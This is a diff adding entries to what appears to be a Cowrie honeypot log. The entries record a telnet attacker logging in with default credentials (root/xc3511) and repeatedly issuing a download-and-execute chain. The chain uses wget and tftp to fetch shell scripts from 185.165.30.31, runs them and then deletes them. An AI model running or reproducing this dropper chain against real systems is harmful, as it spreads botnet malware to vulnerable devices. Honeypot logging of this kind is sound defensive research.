@@ -7291,3 +7291,477 @@
 2017-03-05T16:44:36+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 188.16.72.14:39619 (10.8.41.81:2223) [session: TT41687]
 2017-03-05T16:45:01+0000 [CowrieTelnetTransport,41687,188.16.72.14] first time for 188.16.72.14, need: 1
 2017-03-05T16:45:01+0000 [CowrieTelnetTransport,41687,188.16.72.14] login attempt: 1
+2017-03-05T16:45:02+0000 [CowrieTelnetTransport,41687,188.16.72.14] login attempt [root/xc3511] succeeded
+2017-03-05T16:45:03+0000 [CowrieTelnetTransport,41687,188.16.72.14] Opening TTY Log: log/tty/20170305-164503-None-41687i.log
+2017-03-05T16:45:03+0000 [CowrieTelnetTransport,41687,188.16.72.14] Warning: state changed and new state returned
+2017-03-05T16:45:15+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: sh
+2017-03-05T16:45:15+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: sh 
+2017-03-05T16:45:16+0000 [HoneyPotSSHTransport,8896,116.31.116.51] Remote SSH version: SSH-2.0-PUTTY
+2017-03-05T16:45:16+0000 [HoneyPotSSHTransport,8896,116.31.116.51] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-03-05T16:45:16+0000 [HoneyPotSSHTransport,8896,116.31.116.51] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-05T16:45:16+0000 [HoneyPotSSHTransport,8896,116.31.116.51] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-05T16:45:18+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: (cd /var/run || cd /tmp; rm -rf *.sh); (cd /var/run || cd /tmp; wget http://185.165.30.31/bins.sh; chmod +x bins.sh; sh bins.sh) || (cd /var/run || cd /tmp; busybox wget http://185.165.30.31/bins2.sh; chmod +x bins2.sh; sh bins2.sh) || (cd /var/run || cd /tmp; busybox tftp 185.165.30.31 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh) || (cd /var/run || cd /tmp; busybox tftp -r tftp2.sh -g 185.165.30.31; chmod +x tftp2.sh; sh tftp2.sh); (cd /var/run || cd /tmp; rm -rf *.sh);
+2017-03-05T16:45:18+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:18+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:18+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: rm -rf *.sh
+2017-03-05T16:45:18+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:18+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:18+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: wget http://185.165.30.31/bins.sh
+2017-03-05T16:45:18+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:18+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins.sh) with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:18+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins.sh
+2017-03-05T16:45:18+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-03-05T16:45:18+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:18+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:18+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:18+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:18+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:18+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins2.sh) with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins2.sh
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins2.sh
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: busybox tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp1.sh
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp2.sh
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:19+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh /tmp/bins2.sh
+2017-03-05T16:45:19+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:22+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: (cd /var/run || cd /tmp; rm -rf *.sh); (cd /var/run || cd /tmp; wget http://185.165.30.31/bins.sh; chmod +x bins.sh; sh bins.sh) || (cd /var/run || cd /tmp; busybox wget http://185.165.30.31/bins2.sh; chmod +x bins2.sh; sh bins2.sh) || (cd /var/run || cd /tmp; busybox tftp 185.165.30.31 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh) || (cd /var/run || cd /tmp; busybox tftp -r tftp2.sh -g 185.165.30.31; chmod +x tftp2.sh; sh tftp2.sh); (cd /var/run || cd /tmp; rm -rf *.sh);
+2017-03-05T16:45:22+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:22+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:22+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: rm -rf *.sh
+2017-03-05T16:45:22+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:22+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:22+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: wget http://185.165.30.31/bins.sh
+2017-03-05T16:45:22+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins.sh) with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins.sh
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:22+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:22+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins2.sh) with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins2.sh
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins2.sh
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: busybox tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp1.sh
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp2.sh
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:22+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh /tmp/bins2.sh
+2017-03-05T16:45:22+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:26+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: (cd /var/run || cd /tmp; rm -rf *.sh); (cd /var/run || cd /tmp; wget http://185.165.30.31/bins.sh; chmod +x bins.sh; sh bins.sh) || (cd /var/run || cd /tmp; busybox wget http://185.165.30.31/bins2.sh; chmod +x bins2.sh; sh bins2.sh) || (cd /var/run || cd /tmp; busybox tftp 185.165.30.31 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh) || (cd /var/run || cd /tmp; busybox tftp -r tftp2.sh -g 185.165.30.31; chmod +x tftp2.sh; sh tftp2.sh); (cd /var/run || cd /tmp; rm -rf *.sh);
+2017-03-05T16:45:26+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:26+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:26+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: rm -rf *.sh
+2017-03-05T16:45:26+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:26+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:26+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: wget http://185.165.30.31/bins.sh
+2017-03-05T16:45:26+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins.sh) with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins.sh
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:26+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:26+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins2.sh) with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins2.sh
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins2.sh
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: busybox tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp1.sh
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp2.sh
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:26+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh /tmp/bins2.sh
+2017-03-05T16:45:26+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:29+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: (cd /var/run || cd /tmp; rm -rf *.sh); (cd /var/run || cd /tmp; wget http://185.165.30.31/bins.sh; chmod +x bins.sh; sh bins.sh) || (cd /var/run || cd /tmp; busybox wget http://185.165.30.31/bins2.sh; chmod +x bins2.sh; sh bins2.sh) || (cd /var/run || cd /tmp; busybox tftp 185.165.30.31 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh) || (cd /var/run || cd /tmp; busybox tftp -r tftp2.sh -g 185.165.30.31; chmod +x tftp2.sh; sh tftp2.sh); (cd /var/run || cd /tmp; rm -rf *.sh);
+2017-03-05T16:45:29+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:29+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:29+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: rm -rf *.sh
+2017-03-05T16:45:29+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:29+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:29+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: wget http://185.165.30.31/bins.sh
+2017-03-05T16:45:29+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins.sh) with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins.sh
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:30+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:30+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins2.sh) with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins2.sh
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins2.sh
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: busybox tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp1.sh
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp2.sh
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:30+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh /tmp/bins2.sh
+2017-03-05T16:45:30+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:33+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: (cd /var/run || cd /tmp; rm -rf *.sh); (cd /var/run || cd /tmp; wget http://185.165.30.31/bins.sh; chmod +x bins.sh; sh bins.sh) || (cd /var/run || cd /tmp; busybox wget http://185.165.30.31/bins2.sh; chmod +x bins2.sh; sh bins2.sh) || (cd /var/run || cd /tmp; busybox tftp 185.165.30.31 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh) || (cd /var/run || cd /tmp; busybox tftp -r tftp2.sh -g 185.165.30.31; chmod +x tftp2.sh; sh tftp2.sh); (cd /var/run || cd /tmp; rm -rf *.sh);
+2017-03-05T16:45:33+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:33+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:33+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: rm -rf *.sh
+2017-03-05T16:45:33+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:33+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:33+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: wget http://185.165.30.31/bins.sh
+2017-03-05T16:45:33+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins.sh) with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins.sh
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:33+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:33+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins2.sh) with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins2.sh
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins2.sh
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: busybox tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp1.sh
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp2.sh
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:33+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh /tmp/bins2.sh
+2017-03-05T16:45:33+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:36+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: (cd /var/run || cd /tmp; rm -rf *.sh); (cd /var/run || cd /tmp; wget http://185.165.30.31/bins.sh; chmod +x bins.sh; sh bins.sh) || (cd /var/run || cd /tmp; busybox wget http://185.165.30.31/bins2.sh; chmod +x bins2.sh; sh bins2.sh) || (cd /var/run || cd /tmp; busybox tftp 185.165.30.31 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh) || (cd /var/run || cd /tmp; busybox tftp -r tftp2.sh -g 185.165.30.31; chmod +x tftp2.sh; sh tftp2.sh); (cd /var/run || cd /tmp; rm -rf *.sh);
+2017-03-05T16:45:36+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:36+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:36+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: rm -rf *.sh
+2017-03-05T16:45:36+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:36+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:36+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: wget http://185.165.30.31/bins.sh
+2017-03-05T16:45:36+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins.sh) with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins.sh
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:36+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:36+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
